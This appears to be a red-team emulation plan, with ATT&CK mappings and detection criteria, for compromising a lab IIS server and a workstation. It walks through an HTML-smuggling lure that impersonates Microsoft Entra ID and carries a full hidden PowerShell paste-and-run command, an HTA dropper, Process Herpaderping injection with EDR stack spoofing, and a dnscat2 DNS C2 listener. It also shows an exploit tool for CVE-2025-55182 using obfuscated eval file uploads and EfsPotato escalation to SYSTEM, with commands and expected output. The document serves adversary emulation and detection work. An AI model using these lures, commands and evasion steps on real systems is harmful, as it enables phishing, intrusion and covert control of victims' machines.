# Phase 1 — Initial Access & Command and Control

## Overview

The attacker targets an internal IIS server that hosts two separate web applications: `upload.testlab.local` and `react.testlab.local`. Both applications present distinct exploitation paths that are pursued in parallel.

On the first path, the attacker abuses an unrestricted file upload feature on `upload.testlab.local` to host a malicious HTML page. A targeted employee on a domain workstation is lured to visit the page, which silently delivers a dropper through a copy-paste interaction. The dropper fetches a C2 beacon and a process injector, establishing a covert dnscat2 channel over DNS from the workstation.

On the second path, the attacker directly exploits a React Server Components deserialization vulnerability (CVE-2025-55182) on `react.testlab.local` to achieve unauthenticated RCE on the IIS server itself, then escalates to `NT AUTHORITY\SYSTEM` via `SeImpersonatePrivilege`.

---

## Step 0 - Setup

### Procedures

- ☣️ On the attacker machine, start the dnscat2 server listener

  ```bash
  ruby dnscat2.rb --dns "domain=c2.attacker.local,host=0.0.0.0" --no-cache --secret=<pre-shared-key>
  ```

  - ***Expected Output***

    ```text
    New window created: 0
    dnscat2> Listening for connections...
    ```

- ☣️ Build `CWLHerpaderping.exe` from source with the correct payload drop path

  ```powershell
  msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" /m
  ```

  Output binary: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`

- ☣️ Regenerate `staging.html` with the latest payload embedded

  ```bash
  cd resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/
  python encode-command.py
  ```

  - ***Expected Output***

    ```text
    [+] stage1.hta -> cert_bundle.txt
        Original : 4,xxx bytes
        PEM      : 6,xxx bytes

    [+] Smuggled payload -> staging.html (x,xxx b64 chars)

    --- paste into Win+R ---
    powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\cert_bundle.txt')"
    ```

- ☣️ Upload required files to `upload.testlab.local` via the file upload interface

  | File | Upload path |
  | - | - |
  | `staging.html` | `/uploads/staging.html` |
  | `dnscat2.exe` | `/uploads/dnscat2.exe` |
  | `CWLHerpaderping.exe` | `/uploads/CWLHerpaderping.exe` |

- Verify the lure page is reachable from a browser on the attacker machine

  ```
  http://upload.testlab.local/uploads/staging.html
  ```

---

## Step 1 - Initial Access: Drive-by Compromise via HTML Smuggling

### Voice Track

The attacker sends a targeted link to `http://upload.testlab.local/uploads/staging.html`
to a domain user on a workstation. The page impersonates a **Microsoft Entra ID
certificate compliance portal**, displaying a spinner that reads "Checking device
compliance status..." while it runs several passive environment checks in the
background — screen resolution, browser plugin count, and system timezone — to
avoid executing in sandboxes or analyst VMs. If all checks pass, the page
silently reconstructs a file called `cert_bundle.txt` from a base64 payload
embedded directly inside the HTML and saves it to the user's `Downloads` folder
without issuing any additional outbound HTTP request. This bypasses proxy or DLP
controls that inspect file downloads by filename or MIME type.

The page then presents a two-step instruction overlay styled as a compliance
remediation guide. It instructs the user to press **Win+R**, paste a provided
PowerShell command, and press Enter. The command is pre-loaded into the clipboard
the moment the overlay appears. Pressing Copy only confirms it visually.

The command reads `cert_bundle.txt` and executes it via `iex(gc -Raw ...)`. The
file is a polyglot: it is a valid PEM certificate bundle on the surface, but the
PEM header and footer are wrapped in a PowerShell block comment, making the
base64 content invisible to the PowerShell interpreter. Only the decoder script
at the end of the file is executed. That script extracts the embedded HTA bytes,
drops them as a `.bin` file in `%TEMP%`, renames the file to `.hta`, and
launches it via `mshta.exe`.

### Procedures

- Deliver the lure URL `http://upload.testlab.local/uploads/staging.html` to the
  victim user via internal communication (chat, email, or redirected intranet page)

- On the victim workstation, open the URL in the browser

- Observe: after the 5-second compliance check completes, `cert_bundle.txt` is
  automatically saved to `%USERPROFILE%\Downloads\`

- On the victim workstation, follow the on-screen instructions:
  press **Win+R**, paste the command displayed on the page, press **Enter**

- ☣️ Observe on the victim workstation that `powershell.exe` is spawned with
  `-w h -ep bypass` flags and reads `cert_bundle.txt`

- ☣️ Observe that `mshta.exe` is launched with a `.hta` file from `%TEMP%`

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1189 | Drive-by Compromise | Windows | User visits `http://upload.testlab.local/uploads/staging.html` which initiates file assembly and download without server-side file request | Not Calibrated - Not Benign | Victim visits attacker-hosted lure page masquerading as Entra ID certificate portal | upload.testlab.local, victim-workstation | domain user | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1027.006 | Obfuscated Files or Information: HTML Smuggling | Windows | `cert_bundle.txt` downloaded to `Downloads/` with no outbound HTTP request for that file; browser Blob URL `blob:http://upload.testlab.local/...` created client-side | Not Calibrated - Not Benign | `staging.html` reconstructs `cert_bundle.txt` from base64 blob embedded in the HTML; no server request for the file | victim-workstation | domain user | [staging.html triggerDownload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `cert_bundle.txt` contains base64-encoded content structured between PEM `-----BEGIN CERTIFICATE-----` / `-----END CERTIFICATE-----` delimiters, concealing an HTA payload inside a file that appears to be a legitimate certificate bundle | Not Calibrated - Not Benign | `encode-command.py` produces `cert_bundle.txt` as a polyglot file: PEM header/footer wrap base64-encoded HTA bytes, making the payload appear as a certificate file to the user | victim-workstation | domain user | [encode-command.py encode_pem()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `staging.html` renders UI styled as Microsoft Entra ID certificate compliance portal with Microsoft branding, fonts, and wording; `cert_bundle.txt` uses standard PEM certificate header/footer to present as a legitimate certificate bundle | Not Calibrated - Not Benign | Lure page impersonates Microsoft Entra ID to lower victim suspicion; payload file formatted as a PEM certificate bundle to appear benign | upload.testlab.local, victim-workstation | domain user | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Execution | T1204.004 | User Execution: Malicious Copy and Paste | Windows | `powershell.exe` spawned with parent `explorer.exe` via Win+R Run dialog; command line contains `-w h -ep bypass -c "iex(gc -Raw ...)"` with no interactive shell ancestor | Not Calibrated - Not Benign | Lure page pre-loads PowerShell one-liner into clipboard; user instructed to open Win+R, paste, and press Enter | victim-workstation | domain user | [staging.html buildCommand()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe` spawned with arguments `-w h -ep bypass -c "iex(gc -Raw '...\cert_bundle.txt')"` | Not Calibrated - Not Benign | User pastes and runs the PowerShell command from Win+R | victim-workstation | domain user | [encode-command.py build_ps_command()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `powershell.exe` reads `cert_bundle.txt`, filters base64 lines, and decodes via `Security.Cryptography.FromBase64Transform` | Not Calibrated - Not Benign | PowerShell decodes the base64 content of `cert_bundle.txt` into HTA bytes in memory | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | HTA file written as `hpsolutionsportal.bin` to `%TEMP%` then renamed to `hpsolutionsportal.hta`; filename mimics a legitimate portal application name | Not Calibrated - Not Benign | Payload written with `.bin` extension before rename to `.hta` — filename chosen to resemble a legitimate portal application, reducing suspicion if seen in process list | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Execution | T1218.005 | System Binary Proxy Execution: Mshta | Windows | `mshta.exe` spawned by `powershell.exe` with `%TEMP%\hpsolutionsportal.hta` as argument | Not Calibrated - Not Benign | PowerShell executes `mshta.exe` against the dropped HTA file | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -

---

## Step 2 - Execution & Command and Control: HTA dropper + dnscat2 via Process Herpaderping

### Voice Track

Once `mshta.exe` loads `hpsolutionsportal.hta`, the embedded VBScript runs
entirely in memory. The HTA window shows a minimal "Windows Certificate
Enrollment" dialog that closes itself after five seconds — the entire execution
happens silently behind this facade.

The script performs two sequential downloads from `upload.testlab.local`. First,
it fetches the dnscat2 C2 beacon (`dnscat2.exe`) and saves it to
`C:\ProgramData\CertCA.bin`, a path that requires no elevated privileges to
write. Second, it fetches the process injector (`CWLHerpaderping.exe`), writes it
to `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, and renames it to
`CertEnrollAgent.exe` before executing it with a hidden window — again using the
`.bin`-then-rename pattern to suppress write-time detection.

`CertEnrollAgent.exe` implements **Process Herpaderping**: it reads
`C:\ProgramData\CertCA.bin` into memory, immediately deletes the file from disk
to remove forensic evidence, writes the bytes into a temporary file in `%TEMP%`,
and creates an image section from that file with `NtCreateSection`. A ghost
process is then created from the section via `NtCreateProcessEx`. At this point —
after the section is already mapped into the process — the temporary file on disk
is overwritten with benign content. Any forensic tool or EDR that reads the file
after the fact sees only garbage, while the process runs the original dnscat2
payload. The ghost process is given fake parameters identifying it as
`C:\Windows\System32\RuntimeBroker.exe`. A thread is started at the payload entry
point via `NtCreateThreadEx`.

All five sensitive NT API calls (`NtCreateSection`, `NtCreateProcessEx`,
`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) are
wrapped with a call-stack spoofer that plants a fake return address inside
`kernel32.dll` before each call, defeating user-mode stack-walk inspection by EDR
sensors.

The dnscat2 beacon starts and connects back to the attacker-controlled DNS
server, tunnelling C2 traffic over DNS queries encrypted with the pre-shared key
configured at setup.

### Procedures

- ☣️ Observe on the victim workstation that `mshta.exe` connects to
  `http://upload.testlab.local/uploads/dnscat2.exe` and
  `http://upload.testlab.local/uploads/CWLHerpaderping.exe`

- ☣️ Observe that `C:\ProgramData\CertCA.bin` is created, then deleted
  shortly after `CertEnrollAgent.exe` starts

- ☣️ Observe that `CertEnrollAgent.exe` creates a process whose image path
  reports as `C:\Windows\System32\RuntimeBroker.exe` but whose on-disk image
  does not match the in-memory content

- ☣️ Switch to the attacker machine and confirm the dnscat2 session appears

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  ```

- ☣️ Verify command execution inside the C2 session

  ```text
  command (victim-workstation) 1> shell
  command (victim-workstation) 1> whoami
  ```

  - ***Expected Output***

    ```text
    testlab\<domain-user>
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1106 | Native API | Windows | `mshta.exe` makes outbound HTTP GET to `upload.testlab.local` for `dnscat2.exe` and `CWLHerpaderping.exe` via `MSXML2.XMLHTTP` | Not Calibrated - Not Benign | HTA VBScript downloads two binaries from the attacker-controlled server | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `mshta.exe` writes binary content to `C:\ProgramData\CertCA.bin` and `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin` via `ADODB.Stream.SaveToFile` | Not Calibrated - Not Benign | HTA dropper fetches and drops dnscat2 beacon and Herpaderping loader to disk | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `CertEnrollAgent.exe` drops to `%APPDATA%\Microsoft\Windows\`, a path associated with legitimate Windows components | Not Calibrated - Not Benign | Herpaderping loader written under a legitimate-looking name and path | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1055 | Process Injection | Windows | Process whose `ImageFileName` is `RuntimeBroker.exe` but whose mapped image section does not match the file at that path on disk | Not Calibrated - Not Benign | `CertEnrollAgent.exe` (CWLHerpaderping) creates a ghost process: section mapped from dnscat2, then on-disk temp file overwritten with junk | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `C:\ProgramData\CertCA.bin` deleted immediately after being read into memory by `CertEnrollAgent.exe` | Not Calibrated - Not Benign | Herpaderping deletes the payload file from disk after reading it to remove forensic evidence | victim-workstation | domain user | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | Unusual volume of DNS queries from workstation to `c2.attacker.local`; queries contain encoded subdomain labels characteristic of dnscat2 | Not Calibrated - Not Benign | dnscat2 beacon tunnels C2 traffic over DNS queries to attacker-controlled nameserver | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
| Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | Windows | DNS query payloads encrypted with pre-shared key; traffic is opaque to DNS inspection | Not Calibrated - Not Benign | dnscat2 encrypts C2 traffic with a symmetric pre-shared key | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -

---

## Step 3 - Server-Side RCE & Privilege Escalation: React Server Components Exploitation (CVE-2025-55182)

### Voice Track

While the workstation attack path runs concurrently via `upload.testlab.local`,
the attacker separately exploits `react.testlab.local` — a Next.js application
running on the same IIS server under `iisnode`. The server exposes a React
Server Components (RSC) endpoint that deserializes untrusted flight data and
passes it directly into a `Promise.resolve()` call without validation. By
crafting a multipart POST request that contains a malicious RSC payload, the
attacker manipulates the `__proto__.then` chain of a resolved model to inject
an arbitrary JavaScript string into the `_prefix` field of the response object.
When `iisnode` evaluates this field, the injected code runs with the privileges
of the IIS Application Pool identity (`IIS APPPOOL\react.testlab.local`).

This gives the attacker direct unauthenticated code execution on the IIS
server host — no workstation pivot or lateral movement required. The attacker
exploits this code execution primitive entirely through the Node.js `eval()` API
— no child process is spawned at this stage. All file operations (write, append,
decode) are performed using `process.mainModule.require('fs')` calls wrapped in
`eval(String.fromCharCode(...))` to obfuscate the JavaScript source from
string-based detection in server logs. A pre-encoded base64 payload
(`EfsPotato.exe`) is transferred to the server in 2,000-character chunks and
then decoded in-memory via `Buffer.from(..., 'base64')`.

With the file on disk at `C:\Windows\Temp\EfsPotato.exe`, the attacker confirms
that the AppPool identity holds `SeImpersonatePrivilege` — a standard entitlement
for IIS worker processes. EfsPotato abuses the MS-EFSR `EfsRpcEncryptFileSrv`
named pipe to coerce a SYSTEM-level impersonation token, then spawns the
specified command under that token using `CreateProcessWithTokenW`. The attacker
achieves `NT AUTHORITY\SYSTEM` on the IIS server host.

### Setup

- ☣️ Encode `EfsPotato.exe` to base64 on the attacker machine

  ```bash
  cd resources/payloads/react2shell-tool
  python encode_payload.py EfsPotato.exe -o EfsPotato.b64 -l 0
  ```

  - ***Expected Output***

    ```text
    [+] Encoding successful!
    [*] Original size: 17920 bytes
    [*] Encoded size:  23896 chars
    [*] Output file:   EfsPotato.b64
    ```

### Procedures

- ☣️ Launch the interactive exploitation shell against the target

  ```bash
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Connection established!
    ```

- ☣️ Confirm RCE and current identity

  ```
  rce > whoami
  ```

  - ***Expected Output***

    ```text
    iis apppool\react.testlab.local
    ```

- ☣️ Confirm `SeImpersonatePrivilege` is present

  ```
  rce > whoami /priv
  ```

  - ***Expected Output (partial)***

    ```text
    SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
    ```

- ☣️ Upload the encoded payload to `C:\Windows\Temp` in chunks via eval (no spawn)

  ```
  rce > upload EfsPotato.b64 C:\Windows\Temp\EfsPotato.b64
  ```

  - ***Expected Output***

    ```text
    [*] Uploading EfsPotato.b64 (23896 chars) via eval (NO spawn - STEALTH!)...
    [*] Uploading in 12 chunk(s) -> C:\Windows\Temp\EfsPotato.b64...
    [+] File uploaded successfully -> C:\Windows\Temp\EfsPotato.b64 (NO process spawn!)
    ```

- ☣️ Decode the base64 file to a native executable via eval (no spawn)

  ```
  rce > decode C:\Windows\Temp\EfsPotato.b64 C:\Windows\Temp\EfsPotato.exe
  ```

  - ***Expected Output***

    ```text
    [+] File decoded successfully -> C:\Windows\Temp\EfsPotato.exe (NO process spawn!)
    ```

- ☣️ Run EfsPotato to escalate to SYSTEM and capture output

  ```
  rce > cmd /c "C:\Windows\Temp\EfsPotato.exe whoami > C:\Windows\Temp\out.txt 2>&1 & exit 0"
  rce > type C:\Windows\Temp\out.txt
  ```

  - ***Expected Output***

    ```text
    [+] Current user: IIS APPPOOL\react.testlab.local
    [+] Pipe: \pipe\lsarpc
    [+] Get Token: <handle>
    [!] process with pid: <pid> created.
    ==============================
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST to React RSC endpoint with malformed `__proto__.then` multipart payload; server responds with `NEXT_REDIRECT` error containing base64-encoded command output in the `Location` header | Not Calibrated - Not Benign | Attacker sends crafted RSC flight data to `react.testlab.local` exploiting CVE-2025-55182 prototype pollution to inject JavaScript into `_prefix` field | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `iisnode` evaluates attacker-controlled JavaScript embedded in the `_prefix` response field; no child process created; execution occurs within the existing Node.js worker process | Not Calibrated - Not Benign | Exploit injects `eval(String.fromCharCode(...))` as the `_prefix` value, executing arbitrary Node.js code in the IIS worker process | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py build_exploit_payload()](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | Multiple sequential POST requests to RSC endpoint each writing or appending a 2,000-char block to `C:\Windows\Temp\EfsPotato.b64` via `fs.writeFileSync` / `fs.appendFileSync`; no outbound connection from server | Not Calibrated - Not Benign | `upload` command transfers EfsPotato.exe encoded as base64 in chunks via eval-based `fs` writes — no child process spawned | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | POST to RSC endpoint triggers `fs.writeFileSync` with `Buffer.from(..., 'base64')` converting `EfsPotato.b64` to `EfsPotato.exe` in `C:\Windows\Temp`; no decoder binary or child process | Not Calibrated - Not Benign | `decode` command decodes base64 file to PE binary using Node.js `Buffer` API via eval — no spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | Windows | `EfsPotato.exe` spawns a process (`pid` visible in output) with SYSTEM token; MS-EFSR `EfsRpcEncryptFileSrv` named pipe binding observed on `\pipe\lsarpc` | Not Calibrated - Not Benign | EfsPotato exploits CVE-2021-36942 (MS-EFSR) to coerce SYSTEM impersonation token from `lsarpc` named pipe | react.testlab.local | NT AUTHORITY\SYSTEM | [EfsPotato.exe](../resources/payloads/react2shell-tool/EfsPotato.exe) | -
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Process created by `EfsPotato.exe` runs as `NT AUTHORITY\SYSTEM`; parent process is the IIS worker (`w3wp.exe` or `node.exe`) with AppPool identity | Not Calibrated - Not Benign | EfsPotato uses `SeImpersonatePrivilege` held by the AppPool identity to impersonate the SYSTEM token and call `CreateProcessWithTokenW` | react.testlab.local | NT AUTHORITY\SYSTEM | [EfsPotato.exe](../resources/payloads/react2shell-tool/EfsPotato.exe) | -

---

## End of Test

### Procedures

- ☣️ Terminate the dnscat2 session from the C2 server

  ```text
  dnscat2> session -k <session-id>
  ```

- Remove dropped artifacts on the victim workstation

  | Artifact | Location |
  | - | - |
  | `hpsolutionsportal.hta` | `%TEMP%\` |
  | `CertEnrollAgent.exe` | `%APPDATA%\Microsoft\Windows\` |
  | `HD*.tmp` (Herpaderping temp file) | `%TEMP%\` |

- Remove uploaded files from `upload.testlab.local`

  | File |
  | - |
  | `/uploads/staging.html` |
  | `/uploads/dnscat2.exe` |
  | `/uploads/CWLHerpaderping.exe` |

- Stop the dnscat2 server listener on the attacker machine
